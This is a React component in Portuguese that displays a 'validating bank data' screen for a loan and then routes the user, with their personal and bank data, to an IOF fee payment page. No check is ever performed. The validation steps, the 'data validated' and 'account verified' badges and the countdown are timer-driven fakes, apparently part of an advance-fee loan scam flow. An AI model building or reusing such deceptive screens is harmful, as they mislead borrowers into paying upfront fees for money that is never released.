
import { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { Loader2, CheckCircle, CreditCard, Shield, Zap } from 'lucide-react';

const BankValidationLoading = () => {
  const [countdown, setCountdown] = useState(7);
  const [currentStep, setCurrentStep] = useState(0);
  const navigate = useNavigate();
  const location = useLocation();
  const { loanValue, personalData, bankData } = location.state || {};

  const validationSteps = [
    { icon: Shield, text: 'Verificando dados bancários...', color: 'text-blue-500' },
    { icon: CheckCircle, text: 'Validando informações da conta...', color: 'text-green-500' },
    { icon: Zap, text: 'Confirmando chave PIX...', color: 'text-yellow-500' },
    { icon: CreditCard, text: 'Preparando liberação do valor...', color: 'text-purple-500' }
  ];

  useEffect(() => {
    const stepTimer = setInterval(() => {
      setCurrentStep((prev) => (prev + 1) % validationSteps.length);
    }, 1750);

    const countdownTimer = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownTimer);
          clearInterval(stepTimer);
          navigate('/pagamento-iof', { 
            state: { 
              loanValue, 
              personalData, 
              bankData 
            } 
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => {
      clearInterval(countdownTimer);
      clearInterval(stepTimer);
    };
  }, [navigate, loanValue, personalData, bankData]);

  const CurrentIcon = validationSteps[currentStep].icon;

  return (
    <div className="min-h-screen bg-gradient-to-br from-blue-50 via-white to-green-50 flex items-center justify-center">
      <div className="container mx-auto px-4">
        <div className="max-w-2xl mx-auto">
          <div className="bg-white rounded-2xl shadow-2xl p-8 text-center space-y-8 border border-blue-100">
            {/* Animated Header */}
            <div className="space-y-6">
              <div className="relative">
                <div className="w-20 h-20 bg-gradient-to-r from-blue-500 to-green-500 rounded-full mx-auto flex items-center justify-center animate-pulse shadow-lg">
                  <Loader2 className="w-10 h-10 text-white animate-spin" />
                </div>
                <div className="absolute -bottom-2 -right-2 w-8 h-8 bg-green-400 rounded-full flex items-center justify-center animate-bounce">
                  <CheckCircle className="w-4 h-4 text-white" />
                </div>
              </div>
              
              <div className="space-y-3">
                <h2 className="text-4xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-600 to-green-600 animate-fade-in">
                  Validando dados bancários
                </h2>
                <p className="text-gray-600 text-lg animate-slide-in-right">
                  Quase lá! Preparando a liberação do seu dinheiro...
                </p>
              </div>
            </div>

            {/* Current Step with Animation */}
            <div className="space-y-6">
              <div className="flex items-center justify-center space-x-4 animate-fade-in">
                <div className="relative">
                  <CurrentIcon className={`w-8 h-8 ${validationSteps[currentStep].color} animate-bounce`} />
                  <div className="absolute inset-0 w-8 h-8 rounded-full animate-ping opacity-25 bg-current"></div>
                </div>
                <span className="text-xl font-medium text-gray-700 animate-slide-in-right">
                  {validationSteps[currentStep].text}
                </span>
              </div>
              
              <div className="w-full bg-gray-200 rounded-full h-4 overflow-hidden shadow-inner">
                <div 
                  className="bg-gradient-to-r from-blue-400 to-green-400 h-4 rounded-full transition-all duration-1000 ease-out shadow-lg animate-pulse"
                  style={{ width: `${((7 - countdown) / 7) * 100}%` }}
                ></div>
              </div>
            </div>

            {/* Validation Icons */}
            <div className="grid grid-cols-2 gap-6">
              <div className="flex items-center space-x-3 p-4 bg-green-50 rounded-lg animate-slide-in-right">
                <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center animate-pulse">
                  <CheckCircle className="w-6 h-6 text-green-600" />
                </div>
                <div className="text-left">
                  <p className="font-semibold text-green-700">Dados validados</p>
                  <p className="text-sm text-green-600">Informações confirmadas</p>
                </div>
              </div>
              
              <div className="flex items-center space-x-3 p-4 bg-blue-50 rounded-lg animate-slide-in-right delay-100">
                <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center animate-pulse">
                  <CreditCard className="w-6 h-6 text-blue-600" />
                </div>
                <div className="text-left">
                  <p className="font-semibold text-blue-700">Conta verificada</p>
                  <p className="text-sm text-blue-600">Pronta para receber</p>
                </div>
              </div>
            </div>

            {/* Countdown with glow effect */}
            <div className="relative">
              <div className="text-6xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-500 to-green-500 animate-pulse">
                {countdown}
              </div>
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-24 h-24 border-4 border-blue-200 rounded-full animate-spin opacity-30"></div>
              </div>
            </div>

            {/* Floating particles */}
            <div className="relative overflow-hidden">
              <div className="absolute top-2 left-8 w-2 h-2 bg-blue-400 rounded-full animate-bounce delay-200"></div>
              <div className="absolute top-12 right-12 w-3 h-3 bg-green-400 rounded-full animate-bounce delay-500"></div>
              <div className="absolute bottom-8 left-16 w-2 h-2 bg-purple-400 rounded-full animate-bounce delay-700"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default BankValidationLoading;
